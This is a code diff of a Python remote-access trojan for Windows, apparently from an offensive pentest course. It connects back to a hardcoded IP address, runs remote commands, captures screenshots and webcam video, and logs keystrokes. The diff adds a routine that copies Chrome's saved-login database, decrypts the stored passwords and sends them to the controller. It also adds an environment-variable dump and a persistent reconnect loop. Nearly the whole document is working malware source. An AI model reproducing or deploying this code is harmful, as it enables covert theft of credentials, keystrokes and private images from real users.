@@ -1,14 +1,38 @@
-# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
-from PIL import ImageGrab 
-import socket, subprocess, os, tempfile 
-import shutil, threading, win32api
-import pythoncom, pyHook          
-import numpy
-import cv2
+from __future__ import print_function
+from shutil import copyfile
+from PIL import ImageGrab
+from os import getenv  
+import sqlite3, win32crypt, socket, subprocess, os, tempfile 
+import shutil, threading, win32api, pythoncom, random         
+import numpy, sys, pyHook, shutil, cv2, time
 
 keyLog = tempfile.mkdtemp()
 f_name = keyLog+"\log.txt"
-ip_address = '192.168.69.12'
+ip_address = '192.168.10.11'
+
+def get_chrome_path(s):
+    try:
+        path = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data"
+        path2 = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login2"
+        copyfile(path, path2)
+
+        conn = sqlite3.connect(path2)
+        cursor = conn.cursor() 
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        
+        chromeDump = tempfile.mkdtemp()
+        with open(chromeDump+'\ChromeDump.txt', 'w+') as f:
+            for raw in cursor.fetchall():
+                print('URL: '+raw[0] + '\n' + 'Username: '+raw[1] , file=f)
+                password = win32crypt.CryptUnprotectData(raw[2])[1] 
+                print('Password: '+password, file=f)
+                print('\n', file=f)
+            
+        conn.close()
+        os.remove(path2)
+        return chromeDump, True
+    except:
+        return "Chrome Doesn't exists", False
 
 def recWebCam():
     try:
@@ -69,6 +93,13 @@ def keypressed(event):
             fp.write(data)
             fp.close()
 
+def environment():
+    resp = ''
+    for n in os.environ:
+        resp += "{0:35}: {1}\n".format(n,os.environ.get(n))
+    resp = resp.replace(';','\n{0:39}: '.format(""))
+    return resp
+
 def startLogger():
     global obj
     obj = pyHook.HookManager()
@@ -92,6 +123,8 @@ def transfer(s,path,command):
             s.send('captured')
         elif 'getLogFile' in command:
             s.send('LogSent')
+        elif 'chromeDump' in command:
+            s.send('DumpSent')
         f.close()
     else: # the file doesn't exist
         s.send('Unable to find out the file')
@@ -111,8 +144,7 @@ def connect():
             command = 'Taskkill /IM '+command[1]+' /F'
             CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         elif 'terminate' in command:
-            s.close()
-            break
+           return 1
         elif 'grab' in command:            
             grab,path = command.split(' ')
             try:
@@ -139,9 +171,19 @@ def connect():
         elif 'stopLogger' in command:
             stopLogger()
             s.send('[+] Keylogger stopped')
+        elif 'about' in command:
+            response = environment()
+            s.send(response)
         elif 'getLogFile' in command:
             transfer(s, f_name, command)
             shutil.rmtree(keyLog)
+        elif 'chromeDump' in command:
+            path, success = get_chrome_path(s)
+            if success:
+                transfer(s, path+"\ChromeDump.txt", command)
+                shutil.rmtree(path)
+            else:
+                s.send("[!] Chrome Doesn't exists")
         elif 'cd' in command:
             code,directory = command.split (' ')
             os.chdir(directory)
@@ -152,16 +194,14 @@ def connect():
             s.send( CMD.stderr.read()  ) 
 
 def main ():
-    connect()
-main()
+    while True:
+        try:
+            if connect() == 1:
+                break
+        except:
+            sleep_for = random.randrange(1, 10)
+            time.sleep(sleep_for)   
+            pass
 
-
-
-
-
-
-
-
-
-
-
+if __name__ == "__main__":
+    main()
